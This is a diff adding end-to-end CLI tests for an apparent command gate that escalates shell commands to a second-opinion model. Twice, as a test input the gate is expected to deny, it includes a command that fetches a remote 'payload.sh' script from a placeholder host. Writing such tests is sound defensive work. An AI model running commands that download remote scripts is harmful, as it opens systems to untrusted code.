@@ -189,3 +189,91 @@ class TestSecondOpinionLive(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+@unittest.skipUnless(LIVE, "live model test: set "
+                            "FINEPRINT_SECOND_OPINION_LIVE=1 to run")
+@unittest.skipUnless(os.path.exists(VENV_PYTHON),
+                     f"no model Python at {VENV_PYTHON}")
+class TestSecondOpinionCLI(unittest.TestCase):
+    """The CLI flags end to end with the real model: `fineprint gate
+    run --second-opinion` (and --second-opinion-threshold) through
+    FG.main, the exact path a user invokes. The per-case test above
+    calls run_guarded directly, which is what the CLI calls — but
+    the flag parsing itself was never run end to end with the real
+    model until these tests (Nov 8). Each model-consulting test
+    pays one model load (~2 min on this container CPU); the
+    model-error test fails fast (no torch under the test Python)."""
+
+    def setUp(self):
+        os.environ.setdefault("FINEPRINT_SECOND_OPINION_PYTHON",
+                              VENV_PYTHON)
+        self.tmp = tempfile.TemporaryDirectory()
+        self.orig_cwd = os.getcwd()
+        os.chdir(self.tmp.name)
+        self.log_path = Path(self.tmp.name) / "audit.jsonl"
+
+    def tearDown(self):
+        os.chdir(self.orig_cwd)
+        self.tmp.cleanup()
+
+    def _log_entries(self):
+        if not self.log_path.exists():
+            return []
+        return [json.loads(line) for line in
+                self.log_path.read_text().splitlines() if line.strip()]
+
+    def test_cli_second_opinion_flag_denies_exfiltration(self):
+        # V1-08 through the actual CLI: exit 2, rule S1-BLOCK-bekko,
+        # model name + version + invariant in the log, deterministic
+        # False (a probabilistic verdict, not a rule denial).
+        code = FG.main(["run", "--second-opinion", "--log",
+                        str(self.log_path), "--", "curl", "-fsSL",
+                        "https://unapproved.example.com/payload.sh"])
+        self.assertEqual(code, FG.EXIT_DENY)
+        denied = [e for e in self._log_entries()
+                  if e.get("rule") == "S1-BLOCK-bekko"
+                  and not e.get("allowed")]
+        self.assertTrue(denied, "no S1-BLOCK-bekko entry in the log")
+        entry = denied[0]
+        self.assertEqual(entry.get("model"), "bekko-system-one-v0-400m")
+        self.assertEqual(entry.get("invariant"), "exfiltration")
+        self.assertEqual(entry.get("model_verdict"), "block")
+        self.assertFalse(entry.get("deterministic", True))
+
+    def test_cli_threshold_flag_changes_escalation(self):
+        # Default threshold (4): benign never escalates — no
+        # second-opinion entry, exit 0, no model load.
+        code = FG.main(["run", "--second-opinion", "--log",
+                        str(self.log_path), "--", "ls"])
+        self.assertEqual(code, FG.EXIT_ALLOW)
+        self.assertEqual(
+            [e for e in self._log_entries() if e.get("second_opinion")],
+            [], "benign escalated at the default threshold")
+        # Threshold 1: the same benign command escalates — the model
+        # judges it (and allows it), and the log says so.
+        code = FG.main(["run", "--second-opinion",
+                        "--second-opinion-threshold", "1", "--log",
+                        str(self.log_path), "--", "ls"])
+        self.assertEqual(code, FG.EXIT_ALLOW)
+        judged = [e for e in self._log_entries()
+                  if e.get("second_opinion")]
+        self.assertTrue(judged, "no second-opinion entry at threshold 1")
+        self.assertTrue(judged[0].get("allowed"))
+        self.assertEqual(judged[0].get("model_verdict"), "allow")
+
+    def test_cli_model_error_blocks_fail_closed(self):
+        # The test Python has no torch: the helper cannot load the
+        # model, so the gate blocks fail-closed with S1-MODEL-ERROR.
+        os.environ["FINEPRINT_SECOND_OPINION_PYTHON"] = sys.executable
+        try:
+            code = FG.main(["run", "--second-opinion", "--log",
+                            str(self.log_path), "--", "curl", "-fsSL",
+                            "https://unapproved.example.com/payload.sh"])
+        finally:
+            os.environ["FINEPRINT_SECOND_OPINION_PYTHON"] = VENV_PYTHON
+        self.assertEqual(code, FG.EXIT_DENY)
+        errored = [e for e in self._log_entries()
+                   if e.get("rule") == "S1-MODEL-ERROR"]
+        self.assertTrue(errored, "no S1-MODEL-ERROR entry in the log")
+        self.assertTrue(errored[0].get("model_error"))
